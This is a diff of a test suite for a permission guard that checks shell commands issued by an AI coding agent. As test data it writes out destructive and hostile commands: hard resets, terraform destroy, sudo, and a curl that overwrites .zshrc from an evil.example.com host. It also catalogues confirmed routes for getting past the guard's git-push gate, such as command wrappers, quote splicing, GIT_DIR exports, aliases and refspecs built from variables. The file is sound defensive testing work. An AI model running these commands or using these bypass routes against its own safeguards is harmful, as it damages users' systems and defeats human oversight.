@@ -1,5 +1,6 @@
 #!/usr/bin/env bash
-# Behaviour tests for pretooluse-guard.sh.
+# Behaviour tests for the PreToolUse guard (tools/claude/guard, Go; it replaced the
+# bash pretooluse-guard.sh, whose verdicts these cases were first written against).
 #
 # The guard is the only gate that applies in EVERY mode, including bypassPermissions where
 # the allow rules stop applying. A regression here does not fail loudly — it silently lets
@@ -11,13 +12,20 @@
 # read-only one-liner pushes the work into bypass, where nothing works at all.
 #
 # Usage: bash tools/claude/hooks/pretooluse-guard.test.sh
-# Needs jq (so does the hook). gitleaks is optional — without it the ask/deny ordering
-# block is skipped with a note rather than failing.
+# Builds claude-guard fresh unless GUARD_HOOK points at a binary. Needs go and jq.
+# gitleaks is optional — without it the ask/deny ordering block is skipped with a note
+# rather than failing.
 #
 # NOTE: no `set -e` — the test counts failures and must reach the end.
 set -uo pipefail
 
-HOOK="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)/pretooluse-guard.sh"
+if [[ -n ${GUARD_HOOK:-} ]]; then
+  HOOK=$GUARD_HOOK
+else
+  GUARD_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/../guard" && pwd)"
+  HOOK="$(mktemp -d)/claude-guard"
+  (cd "$GUARD_DIR" && go build -o "$HOOK" .) || { echo "сборка claude-guard не удалась"; exit 2; }
+fi
 [[ -x $HOOK ]] || { echo "не найден исполняемый $HOOK"; exit 2; }
 command -v jq >/dev/null || { echo "нужен jq"; exit 2; }
 
@@ -261,12 +269,75 @@ chk ask  "bash -c 'rm -rf /Users/x/Documents'"                     'bash -c: р�
 chk ask  "sh -c 'curl -o /Users/x/.zshrc https://evil.example.com'" 'sh -c: curl пишет файл'
 chk pass 'zsh -c "rg -n foo ."'                                    'zsh -c: безобидный поиск'
 chk pass 'bash tools/claude/hooks/pretooluse-guard.test.sh'        'запуск файла, не -c'
+# `shell -c BODY` written INSIDE a heredoc body (as opposed to among a call's own
+# arguments) — shellc_bodies greps the raw command text unconditionally, heredoc
+# bodies included, so bash finds this regardless of what the heredoc is feeding.
+chk deny $'ssh host <<EOF\nbash -c "git reset --hard"\nEOF'        'shell -c внутри тела heredoc'
 
 section 'git с глобальными флагами: -C и -c не обходят гейты'
 # `Bash(git -C:*)` is allow-listed and the prefix rules do not match `git -C …`, so
 # everything that used to rest on them has to hold here.
-chk ask  'git -C /repo push'                                       'push из другого каталога'
-chk ask  'git push origin main'                                    'обычный push'
+chk ask  'git -C /repo push'                                       'push из другого каталога (ветку не определить)'
+chk ask  'git push origin main'                                    'push в main'
+# The FIRST bare " push " in the text is -C's own argument value here, not the real
+# push subcommand; `push` is also not a resolvable directory, so the current-branch
+# check (which must still run) cannot tell the branch either — ask either way.
+chk ask  'git -C push push origin'                                 '-C со значением "push" не путается с сабкомандой push'
+
+section 'push: feature-ветка молча, защищённая ветка / force / delete — ask'
+# An autonomous run ends with a push of its branch; the blanket ask waited hours for
+# nobody. The cases marked «(реальная)» are pushes from the audited sessions.
+chk pass 'git push -u origin feat/session-audit-hints'             'feature-ветка с -u'
+# CONTRADICTS THE WHITELIST (was `chk pass`, a real session transcript): rule 1's
+# shape is exactly `git [-C dir] push [-u|--set-upstream] [remote] [refspec]` —
+# "nothing else: no other flags" — and -q is another flag, so this now asks. A
+# blacklist tolerated -q by never mentioning it; the whitelist has to name every
+# flag it allows silent, and -q was never named. Flagged per task instructions
+# rather than silently widening the shape back open.
+chk ask  'git push -q -u origin worktree-reviews-nightly-sync'     'worktree-ветка (реальная) — -q не входит в белый список shape (было pass)'
+# CONTRADICTS THE WHITELIST (was `chk pass`, a real session transcript): gate 1 (Go
+# port only) requires the push to be the WHOLE command — exactly one segment, no `|`,
+# no `>` — and this line pipes into `tail -1` and redirects stderr, so it now asks.
+# Flagged per task instructions rather than silently widening gate 1 back open.
+chk ask  'git push origin HEAD:k8s-hetzner 2>&1 | tail -1'         'HEAD:ветка с редиректом (реальная) — gate 1: не целая команда (было pass)'
+chk pass 'git push origin "feat/x"'                                'ветка в кавычках'
+chk ask  'git push origin master'                                  'push в master'
+chk ask  'git push origin HEAD:main'                               'HEAD:main'
+chk ask  'git push origin feat/x main'                             'несколько refspec, один защищённый'
+chk ask  'git push origin release/1.2'                             'release/* защищён'
+chk ask  'git push origin main 2>&1 | tail -1; git log --oneline -1' 'push в main в цепочке (реальная)'
+chk ask  'git push --force origin feat/x'                          '--force'
+chk ask  'git push -f origin feat/x'                               '-f'
+chk ask  'git push --force-with-lease origin feat/x'               '--force-with-lease'
+chk ask  'git push origin +feat/x'                                 '+refspec'
+chk ask  'git push origin :old-branch'                             'удаление удалённой ветки через :'
+chk ask  'git push -d origin old-branch'                           'удаление через -d'
+chk ask  'git push --delete origin old-branch'                     'удаление через --delete'
+chk ask  'git push -fu origin feat/x'                              'слитый -fu (force+upstream)'
+chk ask  'git push --all origin'                                   '--all пушит все ветки'
+chk ask  'git push --mirror origin'                                '--mirror пушит всё'
+chk ask  "git push origin 'refs/heads/*:refs/heads/*'"             'glob refspec'
+# A bare `git push` resolves the current branch of the repo it runs in.
+PR="$(mktemp -d)"; git -C "$PR" init -q -b main; git -C "$PR" config user.email t@example.invalid; git -C "$PR" config user.name t
+git -C "$PR" commit -q --allow-empty -m init
+N=$((N + 1)); pid=$(printf '%04d' "$N")
+got=$(jq -nc --arg c "git -C $PR push" '{tool_input:{command:$c}}' | "$HOOK" | jq -r '.hookSpecificOutput.permissionDecision // empty')
+if [[ $got == ask ]]; then printf '%s\n  ok   ask   %s\n' "$SECTION" 'bare push на ветке main — ask'
+else printf '%s\n  FAIL ждали ask, получили %s: %s\n' "$SECTION" "${got:-pass}" 'bare push на ветке main'; fi > "$RES/$pid"
+N=$((N + 1)); pid=$(printf '%04d' "$N")
+got=$(jq -nc --arg c "git -C $PR push origin @" '{tool_input:{command:$c}}' | "$HOOK" | jq -r '.hookSpecificOutput.permissionDecision // empty')
+if [[ $got == ask ]]; then printf '%s\n  ok   ask   %s\n' "$SECTION" '@ трактуется как HEAD, на main — ask'
+else printf '%s\n  FAIL ждали ask, получили %s: %s\n' "$SECTION" "${got:-pass}" '@ трактуется как HEAD, на main'; fi > "$RES/$pid"
+git -C "$PR" checkout -q -b feat/x
+N=$((N + 1)); pid=$(printf '%04d' "$N")
+got=$(jq -nc --arg c "git -C $PR push -u origin HEAD" '{tool_input:{command:$c}}' | "$HOOK" | jq -r '.hookSpecificOutput.permissionDecision // empty')
+if [[ -z $got ]]; then printf '%s\n  ok   pass  %s\n' "$SECTION" 'push HEAD с feature-ветки — молча'
+else printf '%s\n  FAIL ждали pass, получили %s: %s\n' "$SECTION" "$got" 'push HEAD с feature-ветки'; fi > "$RES/$pid"
+N=$((N + 1)); pid=$(printf '%04d' "$N")
+got=$(jq -nc --arg c "git -C $PR push" '{tool_input:{command:$c}}' | "$HOOK" | jq -r '.hookSpecificOutput.permissionDecision // empty')
+if [[ -z $got ]]; then printf '%s\n  ok   pass  %s\n' "$SECTION" 'bare push с feature-ветки — молча'
+else printf '%s\n  FAIL ждали pass, получили %s: %s\n' "$SECTION" "$got" 'bare push с feature-ветки'; fi > "$RES/$pid"
+rm -rf "$PR"
 chk deny 'git -C /repo reset --hard HEAD~1'                        'reset --hard через -C'
 chk deny 'git -C /repo clean -fd'                                  'clean через -C'
 chk deny 'git -C /repo branch -D feature'                          'branch -D через -C'
@@ -478,6 +549,30 @@ chk deny '/bin/sh -c "terraform destroy"'                          'шелл п�
 chk deny 'sh -c "echo hi" && bash -c "terraform destroy"'          'второй -c в той же строке'
 chk pass 'bash -lc "git status"'                                   'безобидное тело не поднимает гейт'
 
+section 'разбор: подстановка внутри export/local/declare/[[ ]]/(( ))/let/C-style for/${a[...]}'
+# A hand-enumerated type switch over Stmt.Cmd is exactly what missed these — each is a
+# distinct AST node the switch never listed, so a $(...) inside it never became a segment.
+chk deny 'export X=$(sudo ls)'                                     'export'
+chk deny 'local X=$(git reset --hard)'                             'local'
+chk deny '[[ -n $(git reset --hard) ]]'                            'test-clause [[ ]]'
+
+section 'разбор: shell -c за обёрткой (env/timeout/…), не только как первое слово'
+# expandShellC used to look only at Args[0]; a wrapper program ahead of the shell hid the
+# -c body from every rule that reads segments.
+chk deny "env bash -c 'git reset --hard'"                          'env bash -c'
+chk deny "timeout 5 sh -c 'terraform destroy'"                     'timeout sh -c'
+
+section 'разбор: shell -c виден даже когда фолбэк — не mvdan/sh-парс (zsh-синтаксис)'
+# The Bash tool runs zsh, so zsh-only syntax the real parser rejects is routine input; the
+# fallback split used to never look for `shell -c BODY` inside such text at all.
+chk deny 'echo ${(j:,:)a}; bash -c '\''sudo ls'\'''                'zsh (j:,:) — фолбэк, но -c виден'
+
+section 'has()/at(): совпадение не пересекает границу строки'
+# (?m) only changes what ^/$ mean; it does nothing to stop [^|] or [[:space:]] from eating a
+# literal \n, so an unrelated three-liner used to read as one exfiltration pipeline.
+chk pass $'set -euo pipefail\ntar czf - src | wc -c\ncurl -s https://example.com/health' \
+                                                                    'set / tar|wc / curl — три независимые строки'
+
 section 'префильтр GATED обязан быть суперсетом правил'
 # The exfiltration rule matches sink names as substrings while the prefilter used a
 # trailing word boundary. The mismatch made the ncat form invisible: a hard deny turned into
@@ -501,8 +596,8 @@ section 'git: глобальные флаги не обходят гейты'
 # it bypasses every git rule at once.
 chk deny 'git --git-dir /tmp/r/.git reset --hard'                  '--git-dir через пробел'
 chk deny 'git --literal-pathspecs clean -fdx'                      '--literal-pathspecs'
-chk ask  'git -P push'                                             '-P перед push'
-chk ask  'git --no-optional-locks push'                            '--no-optional-locks перед push'
+chk ask  'git -P push origin main'                                 '-P перед push'
+chk ask  'git --no-optional-locks push origin main'                '--no-optional-locks перед push'
 chk ask  'git -c core.hooksPath=/tmp/evil status'                  '-c core.hooksPath = чужой код'
 chk pass 'git -c color.ui=false status'                            'безобидный -c не спрашивает'
 
@@ -526,6 +621,41 @@ else
   fail=$((fail + 1)); printf '  FAIL команда ~290 КБ обрабатывалась %d с (порог 15)\n' "$elapsed"
 fi
 rm -f "$big"
+
+section 'push: перезапись гейта как WHITELIST — подтверждённые обходы теперь ask'
+# Раунды ревью находили обходы одного и того же вида: список опасных форм рос, а
+# решение оставалось BLACKLIST-ом (перечисли форму — запрети её). Гейт теперь
+# WHITELIST: молча — только когда ВСЕ пять правил выполнены (см. комментарий у
+# push_needs_confirm/pushNeedsConfirm); всё остальное — ask с одной и той же
+# причиной "could not tell the target". Каждая строка ниже — подтверждённый обход
+# из ревью (был silent, стал ask) либо обёртка/квотинг, который push_exact_shape
+# больше не признаёт «голым» git.
+chk ask  'git push origin ma""in'                                   'сплайс кавычек внутри refspec'
+chk ask  'git push origin m\ain'                                    'backslash внутри refspec'
+chk ask  'git push origin "feat/x:"main'                            'частичная кавычка перед двоеточием'
+chk ask  'git push origin {main,feat/x}'                            'brace-expansion как refspec'
+chk ask  'git push origin feat/x:heads/main'                        'heads/main без refs/ — тоже protected'
+chk ask  'git push origin HEAD:heads/main'                          'HEAD:heads/main — protected через heads/-префикс'
+chk ask  'git -c remote.origin.push=HEAD:main push'                 '-c remote.origin.push= перед push'
+chk ask  'git -c push.default=matching push'                        '-c push.default= перед push'
+chk ask  'git -C /feat -C ../mainrepo push'                         'второй -C'
+chk ask  'export GIT_DIR=/main/.git; git push'                      'export GIT_DIR= отдельной командой'
+chk ask  'GIT_DIR=/main/.git; export GIT_DIR; git push'             'присвоение, затем export по имени'
+chk ask  'declare -x GIT_DIR=/main/.git; git push'                  'declare -x GIT_DIR='
+chk ask  'env GIT_DIR=/main/.git git push'                          'env GIT_DIR= перед git push'
+chk ask  'command git push origin main'                             'command перед git'
+chk ask  'env -C /main git push'                                    'env -C перед git push'
+chk ask  'nice git push origin main'                                'nice перед git push'
+chk ask  'nohup git push origin main'                               'nohup перед git push'
+chk ask  'exec git push origin main'                                'exec перед git push'
+chk ask  'xargs git push origin main'                               'xargs перед git push'
+chk ask  'eval git push origin main'                                'eval перед git push'
+chk ask  '/usr/bin/git push origin main'                            'абсолютный путь до git'
+chk ask  "'git' push origin main"                                   "'git' в кавычках — не голое слово"
+chk ask  'alias g=git; g push origin main'                          'alias-индирекция'
+# Не должно ложно сработать: heads/ГДЕ-ТО-ЕЩЁ, не совпадающее с protected-regex,
+# остаётся молчаливым — heads/-префикс сам по себе не бланкет-ask.
+chk pass 'git push origin feat/x:heads/feat-y'                      'heads/feat-y — не protected, молча'
 
 # --------------------------------------------------------------------------
 # ask/deny ordering. Both deny() and ask() exit 0, so an ask placed ABOVE a deny silently
@@ -599,10 +729,194 @@ else
     }
     xchk deny "$C" "git -C $R commit -m wip"  'секрет в целевом репо найден через -C'
     xchk pass "$R" "git -C $C commit -m wip"  'чистый целевой репо не блокируется утечкой из cwd'
+    # A fake "-C" living in a heredoc-built commit message must not be mistaken for a real
+    # global flag: that sends `git -C <garbage> diff` to a path that does not exist, the
+    # scan fails, and the failure is (by design) treated as "nothing to block".
+    xchk deny "$R" 'git commit -m "$(cat <<'\''EOF'\''
+fix(guard): honour git -C paths
+EOF
+)"'                                        'фиктивный -C в тексте heredoc-сообщения коммита'
     rm -rf "$C"
   fi
   rm -rf "$R"
 fi
+
+section 'разбор: -C выживает даже когда mvdan/sh не парсит строку целиком'
+printf '\n%s\n' "$SECTION"
+# zsh glob-квалификаторы (*(N)) и незамкнутая кавычка обе не парсятся как bash-синтаксис,
+# так что Go-порт уходит на текстовый fallback-путь — и на нём Finding 1 (ревью Opus) был
+# в том, что `git -C <dir>` там вообще пропадал: push/commit разрешались против cwd самого
+# хука, а не против каталога из -C. cwd здесь — чистый репозиторий на feature-ветке;
+# -C указывает на отдельный репозиторий на main, куда и должны попасть push/gitleaks.
+dchk() { # dchk <ожидаем> <cwd> <команда> <описание>
+  local got
+  got=$(jq -nc --arg c "$3" '{tool_input:{command:$c}}' \
+        | (cd "$2" && "$HOOK") \
+        | jq -r '.hookSpecificOutput.permissionDecision // empty')
+  if [[ ${got:-pass} == "$1" ]]; then
+    pass=$((pass + 1)); printf '  ok   %-4s  %s\n' "${got:-pass}" "$4"
+  else
+    fail=$((fail + 1)); printf '  FAIL ждали %s, получили %s: %s\n' "$1" "${got:-pass}" "$4"
+  fi
+}
+FB_MAIN=$(mktemp -d); git -C "$FB_MAIN" init -q -b main
+git -C "$FB_MAIN" config user.email test@example.invalid; git -C "$FB_MAIN" config user.name test
+git -C "$FB_MAIN" commit -q --allow-empty -m init
+FB_FEAT=$(mktemp -d); git -C "$FB_FEAT" init -q -b feat/glob-fallback
+git -C "$FB_FEAT" config user.email test@example.invalid; git -C "$FB_FEAT" config user.name test
+git -C "$FB_FEAT" commit -q --allow-empty -m init
+
+dchk ask "$FB_FEAT" "for f in *.md(N); do :; done; git -C $FB_MAIN push" \
+  'zsh glob-квалификатор — git -C на main всё равно должен дать ask'
+dchk ask "$FB_FEAT" "git -C $FB_MAIN push && echo \"it's done" \
+  'незамкнутая кавычка — git -C на main всё равно должен дать ask'
+
+if ! command -v gitleaks >/dev/null; then
+  skip=$((skip + 1))
+  echo '  SKIP gitleaks не установлен — репро commit-а из Finding 1 пропущено'
+else
+  tok2=$(head -c 400 /dev/urandom | LC_ALL=C tr -dc 'A-Za-z0-9' | head -c 36)
+  printf 'token = "ghp_%s"\n' "$tok2" > "$FB_MAIN/conf.toml"
+  git -C "$FB_MAIN" add conf.toml
+  git -C "$FB_MAIN" diff --cached --no-color > /tmp/fb_main_diff.$$; gitleaks_rc=0
+  gitleaks stdin --no-banner --redact < /tmp/fb_main_diff.$$ >/dev/null 2>&1 || gitleaks_rc=$?
+  rm -f /tmp/fb_main_diff.$$
+  if [[ $gitleaks_rc -ne 1 ]]; then
+    skip=$((skip + 1))
+    echo '  SKIP gitleaks не распознал тестовый токен — репро commit-а из Finding 1 невозможно'
+  else
+    dchk deny "$FB_FEAT" "git -C $FB_MAIN commit -m x && ls src/*.py(N)" \
+      'zsh glob-квалификатор — секрет в целевом репо через -C всё равно найден'
+  fi
+fi
+rm -rf "$FB_MAIN" "$FB_FEAT"
+
+section 'push: перевод строки с backslash не проглатывает текущую ветку (Finding 2)'
+printf '\n%s\n' "$SECTION"
+# Один Go-сегмент покрывает весь `git push \` + перевод строки + `  origin` целиком, и
+# токен "\" от продолжения строки попадал в strings.Fields(rest) как "remote", а настоящий
+# remote после него засчитывался за refspec — has_ref становился true, и проверка текущей
+# ветки пропускалась молча. bash читает по строкам и до второй строки не добирается вовсе,
+# так что remote там тоже мусорный ("\"), has_ref=0, и проверка текущей ветки срабатывает —
+# конечный вердикт совпадает, но по другой причине.
+FB2=$(mktemp -d); git -C "$FB2" init -q -b main
+git -C "$FB2" config user.email test@example.invalid; git -C "$FB2" config user.name test
+git -C "$FB2" commit -q --allow-empty -m init
+dchk ask "$FB2" $'git push \\\n  origin' \
+  'backslash-перевод строки перед origin — ask на main (ветку не проглотило)'
+rm -rf "$FB2"
+
+section 'push: финальное ревью — silent-релаксация не должна пропускать то, что main ловит'
+printf '\n%s\n' "$SECTION"
+# Ревью нашло три дыры в push_needs_confirm/pushNeedsConfirm, все репро проверены с
+# обеих сторон (main = ask, эта ветка bash/go = allow до фикса). cwd — чистый репозиторий
+# на feat/x; MAIN2 — отдельный репозиторий на main, куда реально уходит push в частях
+# репро, использующих его каталог.
+MAIN2=$(mktemp -d); git -C "$MAIN2" init -q -b main
+git -C "$MAIN2" config user.email test@example.invalid; git -C "$MAIN2" config user.name test
+git -C "$MAIN2" commit -q --allow-empty -m init
+FEAT2=$(mktemp -d); git -C "$FEAT2" init -q -b feat/x
+git -C "$FEAT2" config user.email test@example.invalid; git -C "$FEAT2" config user.name test
+git -C "$FEAT2" commit -q --allow-empty -m init
+
+# Finding 1: целевой каталог резолвился только из -C/cwd. cd/pushd в цепочке или
+# подшелле, --git-dir/--work-tree и GIT_DIR= меняют его так, что этот гейт не может
+# его прочитать структурно — must ask, а не тихо резолвить против cwd.
+dchk ask "$FEAT2" "cd $MAIN2 && git push" \
+  'cd в другой репозиторий перед push — cwd больше не тот каталог'
+dchk ask "$FEAT2" "(cd $MAIN2; git push -u origin HEAD)" \
+  'cd в подшелле перед push'
+dchk ask "$FEAT2" "git --git-dir=$MAIN2/.git --work-tree=$MAIN2 push" \
+  '--git-dir/--work-tree — каталог не определить так, как -C'
+dchk ask "$FEAT2" "GIT_DIR=$MAIN2/.git git push" \
+  'GIT_DIR= перед git push — сегмент даже не начинается с "git"'
+
+# Finding 2: --force/--delete/+refspec/protected-target на СТРОКЕ-ПРОДОЛЖЕНИИ должны
+# ask на feature-ветке по своей собственной причине (force/delete/protected), не только
+# случайно совпасть с ask через резолвинг текущей ветки, как в тесте на main выше.
+dchk ask "$FEAT2" $'git push \\\n--force origin feat/x' \
+  '--force на строке-продолжении — feature-ветка, ask всё равно нужен'
+dchk ask "$FEAT2" $'git push origin \\\n+feat/x' \
+  '+refspec на строке-продолжении'
+dchk ask "$FEAT2" $'git push origin \\\n--delete feat/y' \
+  '--delete на строке-продолжении'
+dchk ask "$FEAT2" $'git push origin \\\nmain' \
+  'protected-таргет на строке-продолжении'
+dchk ask "$FEAT2" $'git push origin \\\nfeat/x:main' \
+  'refspec dst=main на строке-продолжении'
+
+# Finding 3: remote/refspec-токен из переменной, parameter expansion или command
+# substitution — не литеральное имя ветки, protected-regex по нему никогда не
+# сработает; одинарные кавычки здесь обязательны, иначе тестовый скрипт сам
+# развернёт $b/${T:-main}/`echo main`/$(...) до того, как команда дойдёт до хука.
+dchk ask "$FEAT2" 'b=main; git push origin $b' \
+  'refspec из переменной ($b) — цель не литеральна'
+dchk ask "$FEAT2" 'git push origin HEAD:${T:-main}' \
+  'refspec с parameter expansion (${T:-main})'
+dchk ask "$FEAT2" 'git push origin `echo main`' \
+  'refspec из command substitution (backtick)'
+dchk ask "$FEAT2" 'git push origin "$(git rev-parse --abbrev-ref origin/HEAD | cut -d/ -f2)"' \
+  'refspec из $(...) в кавычках'
+
+# Держим то, что относилось к силентной релаксации в первую очередь: она не должна
+# развалиться под тяжестью всех этих ask-фиксов.
+dchk pass "$FEAT2" 'git push -u origin feat/x' 'feature-ветка с -u — молча, как и раньше'
+dchk pass "$FEAT2" 'git push'                  'bare push с feature-ветки — молча, как и раньше'
+dchk pass "$MAIN2" "git -C $FEAT2 push"        'git -C на feature-репозиторий — молча, как и раньше'
+dchk pass "$FEAT2" 'git push origin feat/x:feat/x' 'refspec src:dst совпадают, не защищено'
+dchk pass "$FEAT2" 'git push origin HEAD'          'HEAD как refspec на feature-ветке'
+# cwd на main, но refspec явно целится в feat/x — резолвить нужно ЦЕЛЬ, не текущую ветку.
+dchk pass "$MAIN2" 'git push -u origin feat/x'     '-u origin feat/x с cwd на main — refspec решает, не текущая ветка'
+rm -rf "$MAIN2" "$FEAT2"
+
+section 'push: гейты 1-4 (только Go-порт) — перед логикой белого списка'
+printf '\n%s\n' "$SECTION"
+# These four gates exist only in the Go guard (rules.go); the bash version was retired
+# before they were written.
+
+# Gate 1: push должен быть ЦЕЛОЙ командой — один сегмент, без ;&|(){}`$(<># и без
+# trap/source/builtin/command/eval/exec как отдельного слова.
+G1=$(mktemp -d); git -C "$G1" init -q -b feat/gate1
+git -C "$G1" config user.email test@example.invalid; git -C "$G1" config user.name test
+git -C "$G1" commit -q --allow-empty -m init
+dchk ask "$G1" 'git push -u origin feat/gate1; echo done' \
+  'gate 1: ";" после иначе молчащего push — не целая команда'
+dchk ask "$G1" 'git push origin feat/gate-source-cleanup' \
+  'gate 1: слово "source" как отдельное слово внутри refspec (без иных спецсимволов)'
+rm -rf "$G1"
+
+# Gate 2: относительный -C резолвится от payload cwd, а не от cwd самого hook-процесса.
+G2_PARENT=$(mktemp -d)
+G2_FEAT="$G2_PARENT/feat"
+mkdir -p "$G2_FEAT"
+git -C "$G2_FEAT" init -q -b feat/gate2
+git -C "$G2_FEAT" config user.email test@example.invalid; git -C "$G2_FEAT" config user.name test
+git -C "$G2_FEAT" commit -q --allow-empty -m init
+dchk pass "$G2_PARENT" 'git -C feat push' \
+  'gate 2: относительный -C feat резолвится от payload cwd — feature-ветка, молча'
+rm -rf "$G2_PARENT"
+
+# Gate 3: локальный git config не должен незаметно перенаправлять push — config
+# создаётся прямо в fixture-репозитории через `git config`.
+G3=$(mktemp -d); git -C "$G3" init -q -b feat/gate3
+git -C "$G3" config user.email test@example.invalid; git -C "$G3" config user.name test
+git -C "$G3" commit -q --allow-empty -m init
+git -C "$G3" config remote.origin.push 'feat/gate3:main'
+dchk ask "$G3" 'git push -u origin feat/gate3' \
+  'gate 3: remote.origin.push в конфиге переопределяет назначение push'
+rm -rf "$G3"
+
+# Gate 4: назначение должно быть веткой — не имя существующего тега, не HEAD/@ как
+# явный dst в src:dst.
+G4=$(mktemp -d); git -C "$G4" init -q -b feat/gate4
+git -C "$G4" config user.email test@example.invalid; git -C "$G4" config user.name test
+git -C "$G4" commit -q --allow-empty -m init
+git -C "$G4" -c tag.gpgsign=false tag v1
+dchk ask "$G4" 'git push origin v1' \
+  'gate 4: refspec совпадает с именем существующего тега'
+dchk ask "$G4" 'git push origin feat/gate4:HEAD' \
+  'gate 4: HEAD как явный dst в src:dst — не имеет смысла как назначение'
+rm -rf "$G4"
 
 printf '\nпройдено: %d, провалено: %d, пропущено: %d\n' "$pass" "$fail" "$skip"
 [[ $fail -eq 0 ]]
